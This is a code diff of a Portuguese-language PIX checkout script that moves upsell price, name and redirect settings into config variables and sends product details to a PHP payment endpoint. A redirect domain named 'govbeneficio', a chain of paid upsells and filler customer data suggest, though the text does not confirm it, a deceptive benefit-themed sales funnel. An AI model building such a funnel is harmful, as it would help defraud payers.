@@ -170,21 +170,23 @@
 
 <script>
 // =====================================================
-// CONFIGURAÇÃO
+// CONFIGURAÇÃO DO UPSELL (Edite aqui para cada Checkout)
 // =====================================================
+var UPSELL_NOME = 'Fila'; // Nome que vai aparecer na Utmify
+var UPSELL_ID = 'up1'; // ID do Produto
+var UPSELL_VALOR_CENTAVOS = 2790; // Ex: 2790 = R$ 27,90
+var PROXIMO_UPSELL_REDIRECT = 'https://govbeneficio.vercel.app/up2.html'; // Para onde vai após pagar
+// =====================================================
+
 var MEU_PHP_UPSELL = 'https://kitbrinde.online/processar_upsell.php';
 var PARADISE_PRODUCT_HASH = 'prod_f9f49d1b4ff47783'; 
 
-// Único redirecionamento de Upsell
-var UPSELL3_REDIRECT = 'https://govbeneficio.vercel.app/up2.html';
-
-// =====================================================
 var _txid          = null;
 var _pixCode       = '';
 var _qrImage       = '';
 var _expiryTimer   = null;
 var _pixTimer      = null;
-var _paymentAmount = 2500;
+var _paymentAmount = UPSELL_VALOR_CENTAVOS; // Puxa automático da config acima
 var _customerData  = {};
 var STORAGE_KEY    = 'mangofy_pix_tx2';
 
@@ -307,8 +309,8 @@ async function copyPixCode() {
 function updateDiscountBadge() {
     var badge = document.getElementById('discountBadge');
     if (!badge) return;
-    if (_paymentAmount < 2500) {
-        badge.textContent = 'Você ganhou ' + Math.round((2500-_paymentAmount)/2500*100) + '% de desconto!';
+    if (_paymentAmount < UPSELL_VALOR_CENTAVOS) {
+        badge.textContent = 'Você ganhou ' + Math.round((UPSELL_VALOR_CENTAVOS-_paymentAmount)/UPSELL_VALOR_CENTAVOS*100) + '% de desconto!';
         badge.classList.add('show');
     } else { badge.classList.remove('show'); }
 }
@@ -327,26 +329,31 @@ function renderPix() {
 }
 
 // =====================================================
-// REDIRECIONA APÓS APROVAÇÃO
+// REDIRECIONA APÓS APROVAÇÃO (USA A VARIÁVEL DE CONFIGURAÇÃO)
 // =====================================================
 function redirectAfterPayment() {
-    var url  = new URL(UPSELL3_REDIRECT);
+    var url  = new URL(PROXIMO_UPSELL_REDIRECT); 
     var cur  = new URLSearchParams(window.location.search);
     cur.forEach(function(value, key) { url.searchParams.set(key, value); });
     window.location.href = url.toString(); 
 }
 
 // =====================================================
-// POLLING (Verifica pagamento de 2 em 2 segundos)
+// POLLING (Verifica pagamento e manda nome/ID pro PHP)
 // =====================================================
 function pixPolling() {
     if (_pixTimer) clearInterval(_pixTimer);
     _pixTimer = setInterval(async function() {
         try {
             if (!_txid) return;
-            var r = await fetch(MEU_PHP_UPSELL + '?transactionId=' + encodeURIComponent(_txid));
+            var urlConsulta = MEU_PHP_UPSELL + '?transactionId=' + encodeURIComponent(_txid) + '&product_name=' + encodeURIComponent(UPSELL_NOME) + '&product_id=' + encodeURIComponent(UPSELL_ID);
+            
+            var r = await fetch(urlConsulta);
             var s = await r.json();
-            if (s.status === 'approved' || s.status === 'approved_manual') {
+            
+            var statusPagamento = (s.status || s.payment_status || '').toUpperCase();
+            
+            if (statusPagamento === 'APPROVED' || statusPagamento === 'APPROVED_MANUAL' || statusPagamento === 'PAID_OUT' || statusPagamento === 'PAID') {
                 clearInterval(_pixTimer);
                 paymentApproved();
             }
@@ -364,7 +371,7 @@ async function paymentApproved(){
 }
 
 // =====================================================
-// CRIA PIX — PARADISE API
+// CRIA PIX (Manda as variáveis customizadas no POST)
 // =====================================================
 async function createPix() {
     var nome     = getP('nome') || getP('name') || '';
@@ -373,8 +380,8 @@ async function createPix() {
     var telefone = (getP('telefone') || getP('phone') || randomPhone()).replace(/\D/g,'');
     
     var valorRaw = getP('valor');
-    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 2500;
-    if (isNaN(valor) || valor <= 0) valor = 2500;
+    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : UPSELL_VALOR_CENTAVOS;
+    if (isNaN(valor) || valor <= 0) valor = UPSELL_VALOR_CENTAVOS;
     
     var nomeEnvio = nome.trim();
     if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
@@ -385,6 +392,8 @@ async function createPix() {
     var payload = {
         amount_cents: _paymentAmount,
         product_hash: PARADISE_PRODUCT_HASH,
+        product_name: UPSELL_NOME, // Passando o nome dinâmico para o PHP
+        product_id: UPSELL_ID,     // Passando o ID dinâmico para o PHP
         customer: {
             name: nomeEnvio,
             document: cpf,
@@ -409,7 +418,7 @@ async function createPix() {
     });
     
     var data = await response.json();
-    if(!response.ok || !data.qr_code) throw new Error(data.message || 'Erro ao gerar PIX com Paradise');
+    if(!response.ok || !data.qr_code) throw new Error(data.message || 'Erro ao gerar PIX com API');
 
     _txid    = data.transaction_id || '';
     _pixCode = data.qr_code || '';
